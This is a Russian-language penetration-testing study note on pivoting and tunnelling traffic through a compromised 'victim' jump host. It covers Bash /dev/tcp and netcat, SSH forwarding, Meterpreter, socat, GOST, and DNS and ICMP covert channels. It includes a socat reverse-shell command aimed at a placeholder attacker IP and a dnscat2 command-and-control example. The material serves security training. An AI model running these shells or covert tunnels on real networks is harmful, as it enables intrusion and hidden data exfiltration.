## Использование встроенных утилит для проброса трафика

Встроенные утилиты отличаются тем, что используют **только легитимные протоколы туннелирования и работы с портами,** что  
исключает возможность их использования для сокрытия трафика в сети или обхода ограничений.

### **Популярные методы Port2Port в Bash**  
[tunneling-and-port-forwarding#bash](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#bash)
  
_Связывание портов локального сервера в Bash:_

`mknod backpipe p;` — создание именованного конвейера с правилом FIFO  
`nc -lvnp 443 0<backpipe | nc -lvnp 3333 1&>backpipe` — запуск прослушивания порта 443 и проверка конвейера к потоку ввода, привязка потока ввода конвейера к потоку вывода запущенного порта 3333

_Связывание портов локального и удаленного серверов в Bash:_

`exec 3<>/dev/tcp/192.168.1.2/443` — создание файлового дескриптора №3 и связывание потоков ввода-вывода портом 443 внешнего узла 192.168.1.2

`exec 4<>/dev/tcp/0.0.0.0/3333` — создание файлового дескриптора №4 и связывание потоков ввода-вывода портом 3333 самого узла (“Джамп сервера”)

`cat <&3 &>&4 &` — передача в фоновом режиме данных потока ввода из файлового дескриптора №3 на поток вывода файлового дескриптора №4

`cat <&4 &>&3 &` — передача в фоновом режиме данных потока ввода из файлового дескриптора №4 на поток вывода файлового дескриптора №3

### **Популярные методы Port2Port в SSH**  

[tunneling-and-port-forwarding#ssh](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssh)
_Связывание портов локального сервера в SSH на удаленном узле:_

`$ ssh -R 0.0.0.0:10080:127.0.0.1:80 user@10.0.1.3` — при подключении к SSH на узле 10.0.1.3 откроется публичный порт 10080, который будет ссылаться на локальный порт 80 (который доступен только с самого узла)

_Связывание портов локального и удаленного серверов в SSH на удаленном узле:_

`$ ssh -R 0.0.0.0:10033:10.0.2.5:1433 user@10.0.1.3` — при подключении к SSH на узле 10.0.1.3 откроется публичный порт 10033, который будет ссылаться на порт 1433 удаленного узла 10.0.2.5

_Связывание собственного локального порта и удаленного узла за сервером с SSH:_

`# ssh -L 10080:10.0.3.6:80 -N -f -l user@10.0.1.3` — при подключении к SSH на узел 10.0.1.3 на вашем локальном компьютере откроется порт 10080, который будет ссылаться на порт 80 адреса 10.0.3.6 узла стоящего в одной сети с узлом жертвой (10.0.1.3)​​

> ​​​​​В данных примерах узел 10.0.1.3 — узел жертвы, с доступом к узлу по протоколу SSH. Также его называют **“Jump server”.**

### **Использование метода Port2HostNet в SSH**

`ssh -f -N -D 4444 user@10.0.0.1`

При помощи данной команды выполняются следующие действия:

1. Устанавливается SSH-соединение с удаленным хостом по адресу 10.0.0.1, используя имя пользователя user
2. Опция -f заставляет SSH-клиент запуститься в фоновом режиме
3. Опция -N указывает на то, что SSH-клиент не должен выполнять какие-либо команды после подключения к удаленному хосту
4. Опция -D 4444 создает SOCKS-прокси на локальной машине, который слушает порт 4444: все запросы на сетевые ресурсы будут перенаправляться через этот прокси на удаленный хост по зашифрованному каналу SSH (поддерживается Socks4 и Socks5)

> Опция -D в утилите SSH используется для создания динамического SOCKS-прокси на локальной машине. Когда вы используете опцию -D с SSH, SSH клиент подключается к удаленному хосту и на локальной машине открывается локальный SOCKS-прокси-  
> сервер, который может быть использован для перенаправления трафика через зашифрованный туннель SSH на удаленном хосте.

## Использование внешних утилит для проброса трафика

Внешние утилиты позволяют нам не только использовать стандартные протоколы для проброса сетевого трафика, но и **применять изощренные методы передачи трафика в нецелевых для этого протоколах.** Также они могут быть использованы из подручных инструментов, используемых в ходе компрометации: Meterpreter, Cobalt Strike.

Для работы со стандартными протоколами проброса трафика познакомимся с_о следующими популярными утилитами:_

- **Meterpreter** — это продвинутая, динамически расширяемая полезная нагрузка, которая использует [стейджеры](https://encyclopedia.kaspersky.ru/glossary/stager/), инъекции DLL в памяти и распространяется по сети во время выполнения. Он взаимодействует через сокет [стейджера](https://encyclopedia.kaspersky.ru/glossary/stager/) и предоставляет обширный клиентский Ruby API. В нем есть история команд, завершение вкладок, каналы и многое другое.
- **Socat** — расшифровывается как SOcket CAT. Это утилита для передачи данных между двумя адресами. Универсальность socat заключается в том, что адрес может представлять сетевой сокет, любой дескриптор файла, датаграммный или потоковый сокет домена Unix, TCP и UDP (как в IPv4, так и в IPv6), SOCKS 4/4a в IPv4/IPv6, SCTP, PTY, именованные и неименованные конвейеры, OpenSSL, а в Linux — даже любое произвольное сетевое устройство.
- **GOST (GO Simple Tunnel)** — это инструмент для создания зашифрованных туннелей между двумя узлами сети с помощью протокола TCP/UDP, поддерживающий все популярные протоколы проксирования: HTTP/HTTPS/HTTP2/SOCKS4(A)/SOCKS5.
### **Meterpreter**
[tunneling-and-port-forwarding#meterpreter](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#meterpreter)
Для проброса трафика через оболочку Meterpreter используется команда `portfwd`. Запустив эту команду на взломанном узле,  
имеющем доступ к атакующей и целевой сети (или системе), мы можем перенаправлять TCP-соединения через эту машину,  
превращая ее в точку поворота. Подобно технике проброса портов, используемой при ssh-соединении, portfwd будет пересылать TCP-соединения к подключенным машинам и от них.

> _Пример команды:_  
>   
> `meterpreter > portfwd add –l 3389 –p 3389 –r [target host]` — эта команда добавляет проброс порта (port forwarding) с локального порта 3389 на удаленный порт 3389 на целевом хосте [target host].

### **Socat**
[tunneling-and-port-forwarding#ssl-socat-tunnel](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssl-socat-tunnel)
Как мы уже сказали, _socat_ — это полноценный прокси для двунаправленной передачи данных между двумя независимыми каналами данных. Помимо того, что socat умеет пробрасывать трафик используя p2p, он также может служить bind/reverse шеллом, SSL-туннелем, конвейером для передачи данных из сети в устройства и т.п. Это крайне гибкий многофункциональный инструмент ретрансляции.

> _Пример_ — _P2P форвардинг на “джамп” сервере:_  
> `socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &`, где:
> 
> - lport — порт, который будет открыт на узле, где запущен socat
> - redirect_ip — адрес, куда будет направлен трафик с узла
> - rport — адрес порта, куда будет отправлен трафик с порта lport

> _Пример обратного шелла:_  
>   
> ``attacker > socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0`` — поднимает сокет 1337 и берет / кладет туда данные в режиме терминала
> 
> `victim > socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane` — присоединяется к сокету по адресу атакующего и отправляет все данные из него на исполнение

### **GOST**

GO Simple Tunnel не сильно отличается по возможностям от предыдущей утилиты, но имеет более простой синтаксис правил. Также язык разработки GO упрощает компиляцию исполняемого файла под заданную ОС.

> **_Стандартные примеры использования:_**
> 
> _Стандартный HTTP/SOCKS5 прокси:_  
> `gost -L=:8080`
> 
> _Прокси с аутентификацией:_  
> `gost -L=admin:123456@localhost:8080`

  
**Режим цепочки прокси:**

![[Pasted image 20240409144850.png]]

- Прокси сервер_:_ `gost -L=socks://:1080`
- Прокси клиент: `gost -L=:8080 -F=socks://server_ip:1080`
## Использование внешних утилит для скрытия трафика

Утилиты сокрытия трафика и обхода ограничений используют нестандартные протоколы, такие, как DNS и ICMP, позволяя **обойти блокировки или скрыть факт передачи данных.**

### **DNS-туннелирование**

**DNS-туннелирование (DNS Tunneling)** — это метод использования DNS-протокола для передачи данных между компьютерами в  
сети.

Одним из способов реализации DNS-туннелирования является **использование поддоменов.**

> **_Пример:_**
> 
> `OVUWIPJRGAYDCKDSMVTXK3DBOIUSAZ3JMQ6TSOJZFBZGKZ3VNRQXEKI.example.com`
> 
> В имени поддомена закодирована строка: `uid=1001(regular) gid=999(regular)`

Другим способом реализации DNS-туннелирования является использование поля "OPCODE_"_ в запросах DNS.  
Поле _"опкод"_ обычно используется для указания типа запроса (например, запрос на получение записи или запрос на обновление записи), но может также использоваться для передачи полезной нагрузки, включая команды или файлы.  
  
Максимальная длина “OPCODE” равна 4 битам (0-16).

**Особые условия DNS-туннелирования**

- Максимум 253 символа в домене 
- Максимум 63 символа на поддомен
- Нечувствительность к регистру (поэтому мы используем кодировку Base32)
- TXT-запрос для получения максимального количества символов в ответе

**Особенности использования DNS-туннеля: рекурсивные запросы**  
  
Такие запросы позволяют не использовать прямое соединение с сервером управления или прокси, чтобы получать доступ. Это поведение может быть очень полезно в изолированном периметре или сети с ограничениями к соединениям между узлами.

![[Pasted image 20240409145148.png]]

**Утилиты для DNS-туннелирования**

- _DNSCAT2_ — инструмент, предназначенный для создания зашифрованного командно-контрольного канала (C&C) через протокол DNS, который является эффективным туннелем практически из любой сети
- _Iodine_ — программное обеспечение, позволяющее туннелировать данные IPv4 через сервер DNS сервер: это может быть полезно в различных ситуациях, когда доступ в интернет исключен, но DNS-запросы разрешены

> **_Пример работы с DNSCAT2:_**
> 
> Запуск сервера:  
> `./dnscat2.rb our-domain-server.org`  
> Запуск клиента:  
> `./dnscat2 our-domain-server.org`  
>   
> При подключении клиента к серверу вы сможете управлять с сервера терминальной оболочкой, исполняющей команды на агенте.

> **_Пример проброса туннелирования трафика через DNS-туннель:_**  
>   
> `listen 4444 10.0.1.3:80` — поднимет на стороне сервера порт 4444, который будет отправлять трафик на узел 10.0.1.3 на порт 80 на стороне агента

### **ICMP-туннелирование**

**ICMP-туннель** — скрытый канал для передачи данных, организованный между двумя узлами, использующий IP-пакеты с типом  
протокола ICMP.

> **_Пример инструмента:_**  
>   
> _Hans_ — делает возможным туннелирование IPv4 через эхо-пакеты ICMP, поэтому его можно назвать туннелем для пинга. Это  
> может быть полезно в ситуации, когда доступ в Интернет перекрыт, но пинги разрешены.  
>   
> _Для запуска в качестве сервера (от имени root):_  
> `# ./hans -s 10.1.2.0 -p password` — это создаст новое tun-устройство и назначит ему IP 10.1.2.1  
>   
> _Для запуска в качестве клиента (от имени root):_  
> `# ./hans -c server_addess -p пароль` — это позволит подключиться к серверу по адресу "server_addess", создать новое tun-устройство и назначить ему IP из сети 10.1.2.0/24  
>   
> Теперь вы можете запустить прокси на сервере или позволить ему действовать как маршрутизатор и использовать NAT, чтобы  
> разрешить клиентам доступ в Интернет.

## **Материалы для самостоятельного изучения**

- [Доклад](https://www.blackhat.com/presentations/bh-usa-08/Miller/BH_US_08_Ty_Miller_Reverse_DNS_Tunneling_Shellcode.pdf) о загрузке шеллкодов через ДНС-туннели
- Популярные [способы](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding) проброса трафика
- [Об обнаружении](https://habr.com/ru/company/varonis/blog/513160/) ДНС-туннелей

- [Socat - практика](https://web.archive.org/web/20230309175736/https://blog.travismclarke.com/post/socat-tutorial/)
- [Tunneling and port forwarding](https://book.hacktricks.xyz/tunneling-and-port-forwarding)
- [Defeating the network security infrastructure](https://www.radarhack.com/tutorial/DEFEATING_THE_NETWORK_SECURITY_INFRASTRUCTURE.pdf)

- [SOCKSP прокси через веб шелл](https://hackware.ru/?p=9016#36)
- [ICMP туннелирование](https://hackware.ru/?p=9016#5)
- [DNS туннелирование](https://hackware.ru/?p=9016#51)
- [Iodine](https://hackware.ru/?p=9016#52)
- [Dnscat2](https://hackware.ru/?p=9016#521)
- [Rpivot](https://hackware.ru/?p=9016#531)
- [Ресурс gtfobins](https://gtfobins.github.io/)
- [Linux-privilege-escalation](https://myexperiments.io/linux-privilege-escalation.html)

📌 В дополнение:

- [sensepost/reGorg](https://github.com/sensepost/reGeorg)
- [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy)
- [securesocketfunneling ssf](https://github.com/securesocketfunneling/ssf)

📌 Гайды, подсказки и статьи:

- [A Red Teamer's guide to pivoting](https://artkond.com/2017/03/23/pivoting-guide/)
- [Шпаргалки по pivoting](http://archive.fo/LnvIQ#selection-2127.0-2127.46)
- [Материал по Pivoting от Offensive Security](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
- [Network pivoting like a pro](https://medium.com/@6c2e6e2e/network-pivoting-like-a-pro-2fa04a569d8c)
- [SSH Pentesting Guide](https://community.turgensec.com/ssh-hacking-guide/)
- [A Pivot Cheatsheet for Pentesters](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)

📌 Инструменты:

- [ProxyChains-NG](https://kali.tools/?p=2075)
- [RPIVOT](https://github.com/klsecservices/rpivot)
- [reGeorg](https://github.com/sensepost/reGeorg)